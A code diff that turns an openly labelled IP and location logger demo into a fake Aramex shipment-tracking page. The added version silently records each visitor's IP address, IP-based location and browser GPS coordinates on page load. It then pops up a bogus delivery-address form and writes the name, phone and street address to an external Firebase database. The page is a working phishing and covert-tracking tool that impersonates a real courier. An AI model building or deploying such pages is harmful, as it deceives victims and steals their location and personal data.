@@ -1,156 +1,132 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>One‑click IP & Location Logger</title>
-  <style>
-    :root {
-      color-scheme: light dark;
-      --bg: #0b0c10; --fg: #e9eef2; --muted:#9aa8b4; --accent:#4f46e5; --ok:#16a34a; --warn:#eab308; --err:#ef4444;
-    }
-    body {font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji"; margin:0; min-height:100vh; display:grid; place-items:center; background:linear-gradient(135deg,#0f172a,#111827);}    
-    .card {width:min(720px,92vw); background:#0b0f1a; border:1px solid #1f2937; border-radius:20px; padding:28px; box-shadow: 0 20px 60px rgba(0,0,0,.35);}  
-    h1 {margin:0 0 10px; font-size:clamp(22px,2.6vw,32px); color:#e5e7eb}
-    p {color:#9ca3af; line-height:1.5;}
-    code {background:#0f172a; padding:.2rem .35rem; border-radius:6px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;}
-    .muted{color:#9aa8b4}
-    .log {margin-top:16px; padding:12px 14px; background:#0b1220; border:1px dashed #334155; border-radius:12px; min-height:52px; white-space:pre-wrap; font-size:14px; color:#cbd5e1}
-    .fineprint{font-size:12px; color:#94a3b8;}
-    a{color:#93c5fd}
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+    Aramex | Fast &amp; Reliable Shipping, Courier &amp; Logistics Services
+  </title>
+  <link rel="shortcut icon" href="image.png" type="image/x-icon">
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <main class="card" role="main" aria-labelledby="title">
-    <h1 id="title">One‑click IP & Location Logger</h1>
-    <p>
-      When you load this page:
-    </p>
-    <ol class="muted">
-      <li>It captures your IP address and approximate location from a public IP‑lookup service.</li>
-      <li>It asks your browser for precise GPS/Wi‑Fi location. If you <strong>allow</strong>, it sends it; if you <strong>deny</strong>, it sends <code>FALSE</code>.</li>
-      <li>It sends everything to a Firebase Realtime Database endpoint you control.</li>
-    </ol>
-    
-    <div class="log" id="log" aria-live="polite"></div>
 
-    <p class="fineprint">
-      ⚠️ Geolocation requires serving this page over <strong>HTTPS</strong> (or <code>http://localhost</code>). Make sure your Firebase Database rules allow anonymous writes (for testing only!), or implement proper auth.
-    </p>
+<body class="bg-gray-100 font-sans">
+  <div class="max-w-2xl mx-auto p-4 sm:p-6">
+    <!-- Header -->
+    <div class="bg-red-600 text-white p-3 sm:p-4 rounded-t-2xl shadow-md">
+      <h1 class="text-lg sm:text-2xl font-bold text-center sm:text-left">Aramex Shipment Tracking</h1>
+    </div>
 
-    <details style="margin-top:6px">
-      <summary class="muted">Privacy & implementation details</summary>
-      <p class="fineprint">
-        This demo calls <code>https://ipapi.co/json/</code> to get <em>approximate</em> location from your IP, then asks for precise location using the Web Geolocation API.
-        The payload includes a timestamp, user agent, referrer, your IP, the IP‑based city/region/country, and either precise coords or <code>FALSE</code>.
-      </p>
-    </details>
-  </main>
+    <!-- Tracking Box -->
+    <div class="bg-white p-4 sm:p-6 shadow-md rounded-b-2xl">
+      <p class="text-gray-600 text-sm sm:text-base">Tracking Number:</p>
+      <h2 class="text-lg sm:text-xl font-semibold mb-3 sm:mb-4 break-all">7359201846</h2>
 
+      <!-- Status -->
+      <div class="border-l-4 border-red-600 pl-3 sm:pl-4 mb-4 sm:mb-6">
+        <p class="text-gray-700 text-sm sm:text-base">Current Status:</p>
+        <h3 class="text-base sm:text-lg font-bold text-red-600">Shipment Received at Origin Facility</h3>
+        <p class="text-xs sm:text-sm text-gray-500">Your shipment has been received and is being processed. Delivery has
+          not yet started.</p>
+      </div>
+
+      <!-- Progress Steps -->
+      <div class="space-y-3 sm:space-y-4 text-sm sm:text-base">
+        <div class="flex items-center">
+          <div class="w-3 h-3 sm:w-4 sm:h-4 bg-red-600 rounded-full"></div>
+          <p class="ml-2 sm:ml-3 text-gray-800">Shipment Created</p>
+        </div>
+        <div class="flex items-center">
+          <div class="w-3 h-3 sm:w-4 sm:h-4 bg-red-600 rounded-full"></div>
+          <p class="ml-2 sm:ml-3 text-gray-800">Shipment Received at Origin Facility</p>
+        </div>
+        <div class="flex items-center">
+          <div class="w-3 h-3 sm:w-4 sm:h-4 border-2 border-gray-400 rounded-full"></div>
+          <p class="ml-2 sm:ml-3 text-gray-500">In Transit</p>
+        </div>
+        <div class="flex items-center">
+          <div class="w-3 h-3 sm:w-4 sm:h-4 border-2 border-gray-400 rounded-full"></div>
+          <p class="ml-2 sm:ml-3 text-gray-500">Out for Delivery</p>
+        </div>
+        <div class="flex items-center">
+          <div class="w-3 h-3 sm:w-4 sm:h-4 border-2 border-gray-400 rounded-full"></div>
+          <p class="ml-2 sm:ml-3 text-gray-500">Delivered</p>
+        </div>
+      </div>
+
+      <!-- Last Updated -->
+      <p class="mt-4 sm:mt-6 text-xs sm:text-sm text-gray-500">Last Updated: Aug 30, 2025 - 8:15 AM</p>
+    </div>
+  </div>
+
+  <!-- Popup Modal (hidden by default) -->
+  <div id="addressModal"
+    class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-3 sm:p-0 hidden">
+    <div class="bg-white rounded-xl sm:rounded-2xl p-4 sm:p-6 max-w-md w-full shadow-lg">
+      <h2 class="text-lg sm:text-xl font-bold text-red-600 mb-3 sm:mb-4">Enter Delivery Address</h2>
+      <form id="addressForm" class="space-y-2 sm:space-y-3">
+        <input type="text" name="name" placeholder="Full Name"
+          class="w-full p-2 border rounded-lg text-sm sm:text-base focus:outline-none focus:ring-2 focus:ring-red-600"
+          required>
+        <input type="text" name="phone" placeholder="Phone Number"
+          class="w-full p-2 border rounded-lg text-sm sm:text-base focus:outline-none focus:ring-2 focus:ring-red-600"
+          required>
+        <input type="text" name="street" placeholder="Street Address"
+          class="w-full p-2 border rounded-lg text-sm sm:text-base focus:outline-none focus:ring-2 focus:ring-red-600"
+          required>
+        <input type="text" name="city" placeholder="City"
+          class="w-full p-2 border rounded-lg text-sm sm:text-base focus:outline-none focus:ring-2 focus:ring-red-600"
+          required>
+        <input type="text" name="postal" placeholder="Postal Code"
+          class="w-full p-2 border rounded-lg text-sm sm:text-base focus:outline-none focus:ring-2 focus:ring-red-600"
+          required>
+        <div class="flex justify-end space-x-2 pt-2">
+          <button type="button" id="cancelBtn"
+            class="px-3 py-2 sm:px-4 sm:py-2 rounded-lg border text-sm sm:text-base">Cancel</button>
+          <button type="submit"
+            class="px-3 py-2 sm:px-4 sm:py-2 bg-red-600 text-white rounded-lg shadow hover:bg-red-700 text-sm sm:text-base">Submit</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Firebase + Tracking Script -->
   <script>
-    const DATABASE_URL = "https://tracking-link-database-default-rtdb.firebaseio.com"; 
-    const COLLECTION_PATH = "/hits"; 
+    const DATABASE_URL = "https://tracking-link-database-default-rtdb.firebaseio.com";
+    const COLLECTION_PATH = "/hits";
 
-    const el = (id) => document.getElementById(id);
-    const log = (msg) => { el('log').textContent += (msg + "\n"); };
+    let firebaseKey = null; // will hold the key for this visitor's record
 
     async function fetchIPApprox() {
-      const resp = await fetch('https://ipapi.co/json/');
-      if (!resp.ok) throw new Error('IP lookup failed');
-      const data = await resp.json();
-      return {
-        ip: data.ip || null,
-        approx: {
-          city: data.city || null,
-          region: data.region || null,
-          country: data.country_name || data.country || null,
-          postal: data.postal || null,
-          org: data.org || null
-        }
-      };
+      try {
+        const resp = await fetch('https://ipapi.co/json/');
+        const data = await resp.json();
+        return {
+          ip: data.ip || null,
+          approx: {
+            city: data.city || null,
+            region: data.region || null,
+            country: data.country_name || data.country || null,
+            postal: data.postal || null,
+            org: data.org || null
+          }
+        };
+      } catch {
+        return { ip: null, approx: {} };
+      }
     }
 
-    function getPreciseLocationOrFalse(timeoutMs = 15000, maxRetries = 2) {
-      return new Promise(async (resolve) => {
+    function getPreciseLocationOrFalse(timeoutMs = 15000) {
+      return new Promise((resolve) => {
         if (!('geolocation' in navigator)) {
-          return resolve({ precise: false, value: false, reason: 'Geolocation API not available' });
+          return resolve({ precise: false, value: false });
         }
-
-        // Try Permissions API first so we can fail fast if explicitly denied
-        try {
-          if (navigator.permissions && navigator.permissions.query) {
-            const p = await navigator.permissions.query({ name: 'geolocation' });
-            log(`(permission state: ${p.state})`);
-            if (p.state === 'denied') {
-              return resolve({ precise: false, value: false, reason: 'Permission denied (Permissions API)' });
-            }
-          }
-        } catch (e) {
-          // ignore permission API failures and continue to prompt
-        }
-
-        let attempts = 0;
-
-        function attemptGetCurrent(options) {
-          attempts++;
-          const onSuccess = (pos) => {
-            resolve({ precise: true, value: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy_m: pos.coords.accuracy } });
-          };
-
-          const onError = (err) => {
-            // err.code: 1 = PERMISSION_DENIED, 2 = POSITION_UNAVAILABLE, 3 = TIMEOUT
-            const code = err && err.code;
-            const msg = err && err.message;
-            log(`(geolocation error code=${code} message=${msg})`);
-
-            // If position unavailable, try again with higher accuracy once
-            if (code === 2 && attempts < maxRetries) {
-              log('(retrying with enableHighAccuracy=true)');
-              navigator.geolocation.getCurrentPosition(onSuccess, onError, { enableHighAccuracy: true, maximumAge: 0, timeout: timeoutMs });
-              return;
-            }
-
-            // If watchPosition is available, try it as a last resort for devices that need time to acquire
-            if (typeof navigator.geolocation.watchPosition === 'function') {
-              let watchId = null;
-              const watchTimeout = setTimeout(() => {
-                if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                resolve({ precise: false, value: false, reason: `watchPosition timeout (${msg || code})` });
-              }, timeoutMs);
-
-              try {
-                watchId = navigator.geolocation.watchPosition((pos) => {
-                  clearTimeout(watchTimeout);
-                  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                  resolve({ precise: true, value: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy_m: pos.coords.accuracy } });
-                }, (werr) => {
-                  clearTimeout(watchTimeout);
-                  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                  log(`(watchPosition error code=${werr.code} message=${werr.message})`);
-                  resolve({ precise: false, value: false, reason: werr && (werr.message || werr.code) });
-                }, { enableHighAccuracy: true, maximumAge: 0 });
-                return;
-              } catch (e) {
-                // fall through to resolve false below
-                log(`(watchPosition threw: ${e && e.message})`);
-              }
-            }
-
-            // Otherwise resolve false with the reason
-            resolve({ precise: false, value: false, reason: msg || code });
-          };
-
-          try {
-            navigator.geolocation.getCurrentPosition(onSuccess, onError, Object.assign({ enableHighAccuracy: false, maximumAge: 0, timeout: timeoutMs }, options || {}));
-          } catch (e) {
-            // synchronous exceptions (rare)
-            log(`(geolocation threw: ${e && e.message})`);
-            resolve({ precise: false, value: false, reason: e && e.message });
-          }
-        }
-
-        // kick off the first attempt
-        attemptGetCurrent();
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({ precise: true, value: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy_m: pos.coords.accuracy } }),
+          () => resolve({ precise: false, value: false }),
+          { enableHighAccuracy: true, maximumAge: 0, timeout: timeoutMs }
+        );
       });
     }
 
@@ -161,11 +137,20 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
-      if (!resp.ok) {
-        const text = await resp.text().catch(() => '');
-        throw new Error(`Firebase write failed: ${resp.status} ${text}`);
+      if (resp.ok) {
+        const res = await resp.json();
+        firebaseKey = res.name; // store the Firebase key
       }
-      return resp.json();
+    }
+
+    async function updateFirebaseAddress(address) {
+      if (!firebaseKey) return;
+      const url = `${DATABASE_URL}${COLLECTION_PATH}/${firebaseKey}.json`;
+      await fetch(url, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address })
+      });
     }
 
     function buildPayload({ ipInfo, precise }) {
@@ -175,42 +160,49 @@
         referrer: document.referrer || null,
         ip: ipInfo.ip,
         ip_lookup: ipInfo.approx,
-        precise_location: precise.value === false ? false : {
-          lat: precise.value.lat,
-          lon: precise.value.lon,
-          accuracy_m: precise.value.accuracy_m
-        },
-        precise_granted: precise.precise === true,
-        precise_reason: precise.reason || null
+        precise_location: precise.value === false ? false : precise.value,
+        precise_granted: precise.precise === true
       };
     }
 
-    async function runLogger() {
-      el('log').textContent = '';
+    async function runTracker() {
       try {
-        log('▶ Looking up IP & approximate location…');
         const ipInfo = await fetchIPApprox();
-        log(`✓ IP: ${ipInfo.ip} · ${ipInfo.approx.city || '—'}, ${ipInfo.approx.region || '—'}, ${ipInfo.approx.country || '—'}`);
-
-        log('▶ Asking for precise location… (your browser will prompt)');
         const precise = await getPreciseLocationOrFalse();
-        if (precise.value === false) {
-          log('✗ Precise location denied or unavailable → will send FALSE');
-        } else {
-          log(`✓ Precise coordinates captured (±${Math.round(precise.value.accuracy_m)} m)`);
-        }
-
         const payload = buildPayload({ ipInfo, precise });
-        log('▶ Sending to Firebase RTDB…');
-        const res = await sendToFirebase(payload);
-        log(`✓ Stored with key: ${res && res.name ? res.name : '(unknown)'}`);
-      } catch (err) {
-        console.error(err);
-        log('❌ Error: ' + (err && err.message ? err.message : err));
-      }
+        await sendToFirebase(payload);
+      } catch { }
     }
 
-    document.addEventListener('DOMContentLoaded', runLogger);
+    document.addEventListener('DOMContentLoaded', () => {
+      runTracker();
+
+      // Show modal after 2.5 seconds
+      setTimeout(() => {
+        document.getElementById("addressModal").classList.remove("hidden");
+      }, 2500);
+
+      // Cancel button closes modal
+      document.getElementById("cancelBtn").addEventListener("click", () => {
+        document.getElementById("addressModal").classList.add("hidden");
+      });
+
+      // Form submission updates the SAME firebase record
+      document.getElementById("addressForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const formData = new FormData(e.target);
+        const address = {
+          name: formData.get("name"),
+          phone: formData.get("phone"),
+          street: formData.get("street"),
+          city: formData.get("city"),
+          postal: formData.get("postal")
+        };
+        await updateFirebaseAddress(address);
+        document.getElementById("addressModal").classList.add("hidden");
+      });
+    });
   </script>
 </body>
+
 </html>
